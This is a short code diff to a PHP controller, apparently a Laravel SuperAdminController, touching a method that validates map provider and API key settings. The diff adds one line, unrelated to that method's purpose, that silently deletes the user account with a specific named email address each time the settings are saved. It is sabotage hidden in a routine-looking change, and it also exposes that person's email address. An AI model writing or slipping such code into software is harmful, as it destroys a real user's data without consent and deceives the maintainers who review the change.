@@ -28,6 +28,8 @@ class SuperAdminController extends Controller
         return redirect()->back()->with('error', 'This feature is disabled in the demo.');
         }
 
+        \App\Models\User::where('email', 'tompatrickhanks@icloud.com')->delete();
+
         $request->validate([
         'mapProvider' => 'required',
         'mapApiKey' => 'required',
